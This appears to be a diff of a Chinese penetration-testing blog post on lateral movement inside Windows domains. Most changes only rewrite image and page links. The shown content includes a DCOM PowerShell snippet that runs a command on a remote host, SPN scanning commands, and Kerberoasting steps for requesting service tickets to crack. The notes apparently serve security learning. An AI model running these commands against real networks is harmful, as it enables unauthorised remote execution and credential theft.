 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$com</span>=[Type]::GetTypeFromCLSID(<span class="hljs-string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="hljs-string">&quot;10.10.10.11&quot;</span>)<br><span class="hljs-variable">$obj</span>=[System.Activator]::CreateInstance(<span class="hljs-variable">$com</span>)<br><span class="hljs-variable">$item</span>=<span class="hljs-variable">$obj</span>.item()<br><span class="hljs-variable">$item</span>.Document.Application.ShellExecute(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c c:\one&quot;</span>,<span class="hljs-string">&quot;c:\windows\system32&quot;</span>,<span class="hljs-variable">$null</span>,0)<br><br></code></pre></td></tr></table></figure>
 
 
@@ -392,31 +392,33 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">MSSQLSvc/computer1.pentest.com:1433<br>MSSQLSvc  服务组件的名称，此处为mssql服务<br>computer.pentest.com 主机名为computer,域名为pentest.com<br>1433 监听端口为1433<br></code></pre></td></tr></table></figure>
 <p>servicecass和hostname是必选参数,port和servicename是可选参数</p>
 <ul>
-<li><strong>SPN扫描的powershell脚本</strong><br><a target="_blank" rel="noopener" href="https://github.com/PyroTek3/PowerShell-AD-Recon">https://github.com/PyroTek3/PowerShell-AD-Recon</a><br>SPN扫描也称作“扫描Kerberos服务实例名称”<br><img src="https://img-blog.csdnimg.cn/20210605145845201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>这里面有很多扫描spn服务的脚本也有扫描所有服务的<br>1.扫描mssql服务</li>
+<li><strong>SPN扫描的powershell脚本</strong><br><a target="_blank" rel="noopener" href="https://github.com/PyroTek3/PowerShell-AD-Recon">https://github.com/PyroTek3/PowerShell-AD-Recon</a><br>SPN扫描也称作“扫描Kerberos服务实例名称”<br><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214322417.png" srcset="/img/loading.gif" lazyload alt="image-20240107214322417"><br>这里面有很多扫描spn服务的脚本也有扫描所有服务的<br>1.扫描mssql服务</li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">import-moudle .\Discover-PSMSSQL-Servers.ps1<br>Discover-PSMSSQLServers<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210605150153434.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>2.扫描所有服务</p>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214332855.png" srcset="/img/loading.gif" lazyload alt="image-20240107214332855"><br>2.扫描所有服务</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">import-module .\Discover-PSInteresestingServices.ps1<br>Discover-PSInteresestingServices<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/2021060515041918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214344646.png" srcset="/img/loading.gif" lazyload alt="image-20240107214344646"></p>
 <p>在不使用第三方powershell脚本的情况下,输入命令</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -T domain -q */*<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210605151129866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214358364.png" srcset="/img/loading.gif" lazyload alt="image-20240107214358364"></p>
 <ul>
-<li><strong>Kerberoast攻击分析与防范</strong><br>1.配置mssql服务 ，破解该服务的票据<br>手动注册</li>
+<li><p><strong>Kerberoast攻击分析与防范</strong></p>
+<p>1.配置mssql服务 ，破解该服务的票据<br>手动注册</p>
+</li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -A MSSQLSvc/computer.de1ay.com:1433  mssql<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210605160525756.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>2.查看用户对应的SPN<br>查看指定用户注册的SPN</p>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214409269.png" srcset="/img/loading.gif" lazyload alt="image-20240107214409269"><br>     2.查看用户对应的SPN<br>    查看指定用户注册的SPN</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -L de1ay.com\mssql<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210605160716988.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>查看所有注册的SPN</p>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214422225.png" srcset="/img/loading.gif" lazyload alt="image-20240107214422225"><br>    查看所有注册的SPN</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -T domain -q */*<br></code></pre></td></tr></table></figure>
-<p>3.配置指定服务的登录权限<br>在活动目录中为用户配置指定服务的登录权限</p>
+<p>​	3.配置指定服务的登录权限<br>​	在活动目录中为用户配置指定服务的登录权限</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpedit.msc \Computer Configuration\Windows Settings\Security Settings\Local Policies\User Rights Assignment\Log on as a service <br></code></pre></td></tr></table></figure>
 
-<p>4.修改加密类型</p>
+<p>​	4.修改加密类型</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpedit.msc\Computer Configuration\Windows Setting\Security Settings\Local Policies\Seurity Options\Network security: Configure encryption types allowed <span class="hljs-keyword">for</span> Kerberos<br></code></pre></td></tr></table></figure>
-<p>5.请求SPN Kerberos票据<br>打开powershell输入如下命令</p>
+<p>​	5.请求SPN Kerberos票据<br>​	打开powershell输入如下命令	</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Add-Type -AssemblyName System.IdentityModel <br>New-Object System.IdentityModel.Tokens.KerberosRequestor SecurityToken -ArgumentList <span class="hljs-string">&quot;MSSQLSvc/de1ay.de1ay.com&quot;</span><br></code></pre></td></tr></table></figure>
-<p>两篇干货文章</p>
+<p>​	两篇干货文章</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA%3D%3D&amp;chksm=fc781175cb0f986392b4c78112dcd01bf5c71e7d6bdc292f0d8a556cc27e6bd8ebc54278165d&amp;idx=1&amp;mid=2247488936&amp;scene=21&amp;sn=82c127c8ad6d3e36f1a977e5ba122228<span class="hljs-comment">#wechat_redirect</span><br><br>https://blog.csdn.net/shuteer_xu/article/details/106030671<br><br></code></pre></td></tr></table></figure>
 
 <h2 id="Exchange邮件服务"><a href="#Exchange邮件服务" class="headerlink" title="Exchange邮件服务"></a>Exchange邮件服务</h2><ul>
@@ -483,7 +485,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="category-chain-item">内网安全</a>
+  <a href="../../../../../categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="category-chain-item">内网安全</a>
   
   
 
@@ -498,9 +500,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">#内网安全</a>
+        <a href="../../../../../tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">#内网安全</a>
       
-        <a href="/tags/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">#域内横向移动</a>
+        <a href="../../../../../tags/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">#域内横向移动</a>
       
     </div>
   
@@ -555,7 +557,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/06/15/Bypass-waf%E7%AC%94%E8%AE%B0/Bypass-waf%E7%AC%94%E8%AE%B0/" title="Bypass waf笔记">
+                      <a href="../../Bypass-waf%E7%AC%94%E8%AE%B0/Bypass-waf%E7%AC%94%E8%AE%B0/" title="Bypass waf笔记">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">Bypass waf笔记</span>
                         <span class="visible-mobile">上一篇</span>
@@ -565,7 +567,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/" title="域控制器安全">
+                      <a href="../../%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/" title="域控制器安全">
                         <span class="hidden-mobile">域控制器安全</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
@@ -719,8 +721,8 @@
 
 <script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
 <script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
+<script  src="../../../../../js/events.js" ></script>
+<script  src="../../../../../js/plugins.js" ></script>
 
 
   <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
@@ -759,7 +761,7 @@
 
 
   
-    <script  src="/js/img-lazyload.js" ></script>
+    <script  src="../../../../../js/img-lazyload.js" ></script>
   
 
 
@@ -896,7 +898,7 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
-  <script  src="/js/local-search.js" ></script>
+  <script  src="../../../../../js/local-search.js" ></script>
 
 
 
@@ -904,7 +906,7 @@
 
 <!-- 主题的启动项，将它保持在最底部 -->
 <!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
+<script  src="../../../../../js/boot.js" ></script>
 
 
   
